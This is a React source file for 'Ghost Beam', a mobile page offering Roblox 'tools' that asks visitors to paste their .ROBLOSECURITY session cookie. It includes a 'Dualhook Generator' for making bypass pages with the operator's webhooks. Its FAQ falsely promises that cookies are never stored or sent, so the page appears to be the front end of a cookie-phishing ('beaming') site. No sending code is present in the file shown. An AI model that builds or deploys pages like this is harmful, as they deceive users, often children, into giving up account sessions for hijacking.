import { useState } from 'react';
import { AnimatePresence, motion } from 'framer-motion';
import {
  LayoutGrid,
  Shield,
  CheckCircle2,
  RefreshCw,
  Mail,
  Plus,
  Link2,
  Cookie,
  ChevronDown,
  BadgeCheck,
  Lock,
  Loader2,
  X,
} from 'lucide-react';
import profileImg from '@assets/536a85e52aaf91401cd105108c599245_1784941568122.jpg';

const TOOLS = [
  { id: 'age',      name: 'Age Bypasser',       desc: 'Bypass age restrictions on Roblox accounts',                                                                                Icon: Shield },
  { id: 'checker',  name: 'Account Checker',    desc: 'Check account details and inventory',                                                                                       Icon: CheckCircle2 },
  { id: 'refresh',  name: 'Cookie Refresher',   desc: 'Refresh your Roblox cookie',                                                                                                Icon: RefreshCw },
  { id: 'email',    name: 'Email Adder',         desc: 'Add and verify emails on accounts',                                                                                        Icon: Mail },
  { id: 'gamepass', name: 'Gamepass Tool',       desc: 'Create and purchase gamepasses',                                                                                           Icon: Plus },
  { id: 'dual',     name: 'Dualhook Generator',  desc: 'Generate custom bypass pages with your webhooks',                                                                          Icon: Link2 },
  { id: 'cleaner',  name: 'Cookie Cleaner',      desc: 'Cleans cookies with extra symbols, spaces, or wrappers. Does not change your cookie value — works whether the cookie is valid or not', Icon: Cookie },
];

const FAQS = [
  { q: 'Is this safe to use?',              a: 'Ghost Beam uses secure processing and never stores your cookie. Your data is processed locally and never sent to third-party servers.' },
  { q: 'How long does the bypass take?',    a: 'The bypass process typically takes 10–30 seconds depending on server load. Please be patient and do not refresh the page.' },
  { q: 'Why do I need to provide my cookie?', a: 'The .ROBLOSECURITY cookie is required to authenticate with Roblox servers. Without it, we cannot process account modifications.' },
  { q: 'Does it work on all accounts?',     a: 'Ghost Beam works on most Roblox accounts. Some accounts with extra security measures may require additional steps.' },
];

export default function App() {
  const [showDiscord, setShowDiscord] = useState(true);
  const [toolsOpen, setToolsOpen]   = useState(false);
  const [activeId, setActiveId]     = useState('age');
  const [cookie, setCookie]         = useState('');
  const [verifying, setVerifying]   = useState(false);

  const activeTool = TOOLS.find(t => t.id === activeId)!;

  const handleVerify = (e: React.FormEvent) => {
    e.preventDefault();
    setVerifying(true);
    setTimeout(() => setVerifying(false), 3000);
  };

  return (
    <div className="min-h-screen bg-black text-white font-sans">
      {/* ── centred phone-width wrapper ── */}
      <div className="relative mx-auto max-w-[480px] min-h-screen flex flex-col overflow-hidden">

        {/* HEADER */}
        <header className="flex items-center justify-between px-4 py-3 border-b border-white/[0.07]">
          <span className="text-xs font-semibold tracking-[0.18em] uppercase text-white/80">
            Ghost Beam
          </span>
          <button
            data-testid="button-open-tools"
            onClick={() => setToolsOpen(true)}
            className="p-1 text-white/50 hover:text-white transition-colors"
          >
            <LayoutGrid className="w-5 h-5" />
          </button>
        </header>

        {/* SCROLL BODY */}
        <main className="flex-1 flex flex-col gap-3 px-4 py-4 overflow-y-auto">

          {/* ANNOUNCEMENT CARD */}
          <div className="rounded-2xl border border-white/[0.08] bg-[#0d0d0d] p-4">
            <div className="flex items-center gap-2 mb-3">
              <span className="w-2 h-2 rounded-full bg-red-500" />
              <span className="text-[10px] font-bold tracking-[0.2em] uppercase text-red-400">
                Announcement
              </span>
            </div>

            <div className="flex items-start gap-3">
              <img
                src={profileImg}
                alt="Mzk"
                className="w-9 h-9 rounded-full object-cover border border-white/10 flex-shrink-0"
              />
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-1 mb-1">
                  <span className="text-sm font-bold text-white">Mzk</span>
                  <BadgeCheck className="w-3.5 h-3.5 text-blue-400 flex-shrink-0" />
                  <span className="text-[11px] text-white/30 truncate">ov</span>
                </div>
                <p className="text-[12px] text-white/55 leading-relaxed">
                  The Age Bypasser is back online. You can now bypass age
                  restrictions on your account again. Thank you for your patience.
                </p>
              </div>
            </div>
          </div>

          {/* ACTIVE TOOL ROW */}
          <div className="rounded-2xl border border-white/[0.08] bg-[#0d0d0d] p-4 flex items-center gap-3">
            <div className="w-9 h-9 rounded-full border border-white/10 bg-white/[0.04] flex items-center justify-center flex-shrink-0">
              <activeTool.Icon className="w-4 h-4 text-white/70" />
            </div>
            <div className="flex-1 min-w-0">
              <p className="text-sm font-semibold text-white truncate">{activeTool.name}</p>
              <p className="text-[11px] text-white/35 truncate">Instant account unlock</p>
            </div>
          </div>

          {/* COOKIE / VERIFY SECTION */}
          <div className="rounded-2xl border border-white/[0.08] bg-[#0d0d0d] overflow-hidden">
            {/* label row */}
            <div className="flex items-center gap-2 px-4 py-2.5 border-b border-white/[0.07]">
              <Lock className="w-3 h-3 text-white/25" />
              <span className="text-[11px] font-mono tracking-widest text-white/35 uppercase">
                .roblosecurity
              </span>
            </div>

            <div className="p-4 flex flex-col gap-3">
              {/* warning block */}
              <div className="rounded-lg bg-black/60 border border-white/[0.06] px-3 py-2.5 font-mono text-[10px] leading-5 text-white/25">
                _WARNING: DO NOT SHARE-<br />
                someone-to-log-in-as-you.<br />
                11items
              </div>

              {/* cookie textarea */}
              <textarea
                data-testid="input-cookie"
                value={cookie}
                onChange={e => setCookie(e.target.value)}
                placeholder="Paste your .ROBLOSECURITY cookie here..."
                rows={3}
                className="w-full resize-none rounded-lg bg-black/50 border border-white/[0.08] px-3 py-2.5 text-xs text-white/70 placeholder:text-white/20 focus:outline-none focus:border-white/20 transition-colors font-mono"
              />

              {/* verify button */}
              <form onSubmit={handleVerify}>
                <button
                  data-testid="button-verify"
                  type="submit"
                  className="w-full rounded-xl py-3 flex items-center justify-center gap-2 text-sm font-semibold transition-all bg-[#0f2a1a] border border-green-800/50 text-green-400 hover:bg-[#142f1f] active:scale-[0.98]"
                >
                  {verifying ? (
                    <>
                      <Loader2 className="w-4 h-4 animate-spin" />
                      Verificando...
                    </>
                  ) : (
                    <>
                      <Lock className="w-4 h-4" />
                      Verificar
                    </>
                  )}
                </button>
              </form>
            </div>
          </div>

          {/* FAQ */}
          <div className="flex flex-col gap-2 mt-1 mb-2">
            <p className="text-[10px] font-bold tracking-[0.2em] uppercase text-white/30 px-1">
              FAQ
            </p>
            {FAQS.map((faq, i) => (
              <FaqItem key={i} q={faq.q} a={faq.a} />
            ))}
          </div>

        </main>

        {/* FOOTER */}
        <footer className="py-3 border-t border-white/[0.06] text-center">
          <span className="text-[10px] tracking-widest text-white/15 uppercase">
            Ghost Beam Tools v1.0
          </span>
        </footer>

        {/* ── TOOLS PANEL (right drawer) ── */}
        <AnimatePresence>
          {toolsOpen && (
            <>
              {/* backdrop */}
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                transition={{ duration: 0.15 }}
                className="absolute inset-0 z-40 bg-black/60 backdrop-blur-[2px]"
                onClick={() => setToolsOpen(false)}
              />

              {/* panel */}
              <motion.div
                initial={{ x: '100%' }}
                animate={{ x: 0 }}
                exit={{ x: '100%' }}
                transition={{ type: 'tween', ease: 'easeOut', duration: 0.22 }}
                className="absolute top-0 right-0 bottom-0 z-50 w-[78%] bg-[#0a0a0a] border-l border-white/[0.08] flex flex-col"
              >
                {/* panel header */}
                <div className="flex items-start justify-between px-5 py-4 border-b border-white/[0.08]">
                  <div>
                    <p className="text-sm font-bold text-white tracking-wide">TOOLS</p>
                    <p className="text-[11px] text-white/35 mt-0.5">Select a tool to use</p>
                  </div>
                  <button
                    data-testid="button-close-tools"
                    onClick={() => setToolsOpen(false)}
                    className="border border-white/15 rounded p-1 text-white/40 hover:text-white transition-colors"
                  >
                    <LayoutGrid className="w-4 h-4" />
                  </button>
                </div>

                {/* tool list */}
                <div className="flex-1 overflow-y-auto px-3 py-3 flex flex-col gap-1.5">
                  {TOOLS.map(tool => {
                    const active = tool.id === activeId;
                    const { Icon } = tool;
                    return (
                      <button
                        key={tool.id}
                        data-testid={`tool-item-${tool.id}`}
                        onClick={() => { setActiveId(tool.id); setToolsOpen(false); }}
                        className={`w-full text-left flex items-start gap-3 px-3 py-3 rounded-xl border transition-colors ${
                          active
                            ? 'bg-blue-950/50 border-blue-700/30'
                            : 'bg-transparent border-transparent hover:bg-white/[0.04]'
                        }`}
                      >
                        {/* icon circle */}
                        <div className={`mt-0.5 w-8 h-8 rounded-full flex items-center justify-center border flex-shrink-0 ${
                          active
                            ? 'border-blue-500/30 bg-blue-900/30'
                            : 'border-white/[0.09] bg-white/[0.03]'
                        }`}>
                          <Icon className={`w-3.5 h-3.5 ${active ? 'text-blue-300' : 'text-white/40'}`} />
                        </div>

                        {/* text */}
                        <div className="flex-1 min-w-0">
                          <p className={`text-[13px] font-semibold leading-tight ${active ? 'text-white' : 'text-white/75'}`}>
                            {tool.name}
                          </p>
                          <p className="text-[11px] text-white/35 mt-0.5 leading-relaxed">
                            {tool.desc}
                          </p>
                        </div>

                        {/* active dot */}
                        {active && (
                          <span className="mt-1.5 w-2 h-2 rounded-full bg-blue-400 flex-shrink-0" />
                        )}
                      </button>
                    );
                  })}
                </div>
              </motion.div>
            </>
          )}
        </AnimatePresence>

        {/* ── DISCORD MODAL ── */}
        <AnimatePresence>
          {showDiscord && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="absolute inset-0 z-[100] bg-black/75 flex items-center justify-center px-6"
            >
              <motion.div
                initial={{ scale: 0.95, y: 12 }}
                animate={{ scale: 1, y: 0 }}
                exit={{ scale: 0.95, y: 12 }}
                transition={{ type: 'spring', stiffness: 320, damping: 28 }}
                className="w-full max-w-sm rounded-2xl border border-white/[0.1] bg-[#0d0d0d] overflow-hidden"
              >
                {/* modal header */}
                <div className="flex items-start justify-between px-5 pt-5 pb-4 border-b border-white/[0.07]">
                  <div>
                    <p className="text-base font-bold text-white">Join Our Community</p>
                    <p className="text-xs text-white/40 mt-0.5">Connect with thousands of users</p>
                  </div>
                  <button
                    data-testid="button-close-discord"
                    onClick={() => setShowDiscord(false)}
                    className="text-white/30 hover:text-white transition-colors mt-0.5"
                  >
                    <X className="w-4 h-4" />
                  </button>
                </div>

                <div className="p-5 flex flex-col gap-3">
                  {/* server card */}
                  <div className="flex items-center gap-3 bg-white/[0.04] border border-white/[0.07] rounded-xl p-3">
                    <div className="w-10 h-10 rounded-xl bg-[#5865F2] flex items-center justify-center flex-shrink-0">
                      <DiscordIcon className="w-6 h-6 text-white" />
                    </div>
                    <div>
                      <p className="text-sm font-semibold text-white">Ghost Beam Community</p>
                      <div className="flex items-center gap-1.5 mt-0.5">
                        <span className="w-1.5 h-1.5 rounded-full bg-green-500" />
                        <span className="text-[11px] text-white/40">Active Support</span>
                      </div>
                    </div>
                  </div>

                  {/* join button */}
                  <a
                    data-testid="link-join-discord"
                    href="https://discord.gg/zxNqr8Zpd"
                    target="_blank"
                    rel="noreferrer"
                    onClick={() => setShowDiscord(false)}
                    className="w-full bg-[#5865F2] hover:bg-[#4752C4] active:bg-[#3b44b0] text-white font-semibold py-3 rounded-xl transition-colors text-sm text-center flex items-center justify-center gap-2"
                  >
                    <DiscordIcon className="w-4 h-4" />
                    Join Discord Server
                  </a>

                  {/* maybe later */}
                  <button
                    data-testid="button-maybe-later"
                    onClick={() => setShowDiscord(false)}
                    className="text-xs text-white/25 hover:text-white/50 transition-colors text-center py-1"
                  >
                    Maybe Later
                  </button>
                </div>
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>

      </div>
    </div>
  );
}

/* ── sub-components ── */

function FaqItem({ q, a }: { q: string; a: string }) {
  const [open, setOpen] = useState(false);
  return (
    <div className="rounded-xl border border-white/[0.07] bg-[#0d0d0d] overflow-hidden">
      <button
        data-testid={`faq-item-${q.slice(0, 10).replace(/\s/g, '-').toLowerCase()}`}
        onClick={() => setOpen(o => !o)}
        className="w-full flex items-center justify-between px-4 py-3.5 text-left gap-3"
      >
        <span className="text-[13px] text-white/60">{q}</span>
        <ChevronDown
          className={`w-4 h-4 text-white/25 flex-shrink-0 transition-transform duration-200 ${open ? 'rotate-180' : ''}`}
        />
      </button>
      <AnimatePresence>
        {open && (
          <motion.div
            initial={{ height: 0 }}
            animate={{ height: 'auto' }}
            exit={{ height: 0 }}
            transition={{ duration: 0.18 }}
            className="overflow-hidden"
          >
            <p className="px-4 pb-4 pt-0 text-xs text-white/35 leading-relaxed border-t border-white/[0.05]">
              {a}
            </p>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

function DiscordIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 127.14 96.36" fill="currentColor">
      <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.31,60,73.31,53s5-12.74,11.43-12.74S96.2,46,96.12,53,91.08,65.69,84.69,65.69Z" />
    </svg>
  );
}
